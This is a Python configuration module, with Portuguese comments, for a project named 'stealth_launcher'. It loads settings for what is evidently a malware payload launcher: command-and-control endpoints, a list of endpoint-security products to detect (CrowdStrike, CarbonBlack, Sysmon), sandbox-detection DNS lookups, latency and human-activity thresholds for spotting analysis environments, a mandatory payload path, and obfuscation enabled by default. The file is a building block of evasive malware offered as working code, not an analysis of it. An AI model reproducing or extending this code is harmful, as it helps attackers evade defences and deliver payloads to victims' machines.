import os
import sys
import json
import yaml
from pathlib import Path
from typing import Any, Dict, List, Optional, Union

class Config:
    def __init__(
        self,
        mutex_name: str,
        log_file: Path,
        verbose: bool,
        max_runtime_s: int,
        c2_endpoints: List[str],
        edr_process_names: List[str],
        sandbox_dns_lookups: List[str],
        latency_threshold_ms: int,
        min_human_actions: int,
        payload_path: Path,
        signature_hash: Optional[str],
        obfuscate: bool,
    ):
        self.mutex_name = mutex_name
        self.log_file = log_file
        self.verbose = verbose
        self.max_runtime_s = max_runtime_s
        self.c2_endpoints = c2_endpoints
        self.edr_process_names = edr_process_names
        self.sandbox_dns_lookups = sandbox_dns_lookups
        self.latency_threshold_ms = latency_threshold_ms
        self.min_human_actions = min_human_actions
        self.payload_path = payload_path
        self.signature_hash = signature_hash
        self.obfuscate = obfuscate


def _parse_env_list(raw: str) -> List[str]:
    """
    Tenta decodificar JSON ou CSV simples de valores.
    """
    try:
        return json.loads(raw)
    except Exception:
        return [item.strip() for item in raw.split(',') if item.strip()]


def load_config(config_file: Union[Path, str, None] = None) -> Config:
    # 1) Defaults
    defaults: Dict[str, Any] = {
        'MUTEX_NAME': 'Global\\StealthLauncherMutex',
        'LOG_FILE': str(Path.home() / 'stealth_launcher.log'),
        'VERBOSE': False,
        'MAX_RUNTIME_S': 300,
        'C2_ENDPOINTS': [],
        'EDR_PROCESS_NAMES': ['CrowdStrike', 'CarbonBlack', 'Sysmon'],
        'SANDBOX_DNS_LOOKUPS': ['sandbox.check[.]com'],
        'LATENCY_THRESHOLD_MS': 100,
        'MIN_HUMAN_ACTIONS': 5,
        'OBFUSCATE': True,
    }

    # 2) Carregar YAML (pode não existir)
    cfg: Dict[str, Any] = {}
    # Se config_file foi passado, usa-o; caso contrário busca em stealth_launcher/stages/config/config.yaml
    path = (
        Path(config_file)
        if config_file
        else Path(__file__).resolve().parent / 'stages' / 'config' / 'config.yaml'
    )
    if path.is_file():
        try:
            with open(path, 'r', encoding='utf-8') as f:
                cfg = yaml.safe_load(f) or {}
        except yaml.YAMLError as ye:
            print(f"Erro ao parsear {path}: {ye}", file=sys.stderr)
            raise

    # 3) Função auxiliar de lookup
    def get(
        cfg_key: str,
        env_var: str,
        default: Any,
        *,
        cast: Optional[type] = None,
        is_list: bool = False
    ) -> Any:
        # 3.1) Checa variável de ambiente
        if env_var in os.environ:
            val = os.environ[env_var]
            if is_list:
                return _parse_env_list(val)
            if cast is bool:
                return val.lower() in ('1', 'true', 'yes', 'y')
            if cast is int:
                return int(val)
            return cast(val) if cast else val

        # 3.2) Checa no YAML
        if cfg_key in cfg:
            val = cfg[cfg_key]
            if is_list and isinstance(val, str):
                return _parse_env_list(val)
            return cast(val) if (cast and not isinstance(val, cast)) else val

        # 3.3) Default
        return default

    # 4) Extrair valores
    mutex_name          = get('MUTEX_NAME',    'MUTEX_NAME',    defaults['MUTEX_NAME'])
    log_file            = Path(get('LOG_FILE', 'LOG_FILE', defaults['LOG_FILE']))
    verbose             = get('VERBOSE',      'VERBOSE',      defaults['VERBOSE'], cast=bool)
    max_runtime_s       = get('MAX_RUNTIME_S','MAX_RUNTIME_S',defaults['MAX_RUNTIME_S'],cast=int)
    c2_endpoints        = get('C2_ENDPOINTS','C2_ENDPOINTS',defaults['C2_ENDPOINTS'],is_list=True)
    edr_process_names   = get('EDR_PROCESS_NAMES','EDR_PROCESS_NAMES',defaults['EDR_PROCESS_NAMES'],is_list=True)
    sandbox_dns_lookups = get('SANDBOX_DNS_LOOKUPS','SANDBOX_DNS_LOOKUPS',defaults['SANDBOX_DNS_LOOKUPS'],is_list=True)
    latency_threshold_ms= get('LATENCY_THRESHOLD_MS','LATENCY_THRESHOLD_MS',defaults['LATENCY_THRESHOLD_MS'],cast=int)
    min_human_actions   = get('MIN_HUMAN_ACTIONS','MIN_HUMAN_ACTIONS',defaults['MIN_HUMAN_ACTIONS'],cast=int)
    obfuscate           = get('OBFUSCATE',     'OBFUSCATE',     defaults['OBFUSCATE'], cast=bool)

    # 5) Payload path é obrigatório
    payload_raw = get('PAYLOAD_PATH', 'PAYLOAD_PATH', None)
    if not payload_raw:
        raise FileNotFoundError("PAYLOAD_PATH não configurado em YAML ou env.")
    payload_path = Path(payload_raw).expanduser().resolve()

    signature_hash = get('SIGNATURE_HASH','SIGNATURE_HASH',None)

    return Config(
        mutex_name=mutex_name,
        log_file=log_file,
        verbose=verbose,
        max_runtime_s=max_runtime_s,
        c2_endpoints=c2_endpoints,
        edr_process_names=edr_process_names,
        sandbox_dns_lookups=sandbox_dns_lookups,
        latency_threshold_ms=latency_threshold_ms,
        min_human_actions=min_human_actions,
        payload_path=payload_path,
        signature_hash=signature_hash,
        obfuscate=obfuscate,
    )

def verify_signature(path: Path, expected_hash: Optional[str]) -> bool:
    if not expected_hash:
        return True
    from stealth_launcher.stages.payload_integrity import compute_file_hash
    actual = compute_file_hash(path, algorithm="sha256")
    return actual.lower() == expected_hash.lower()
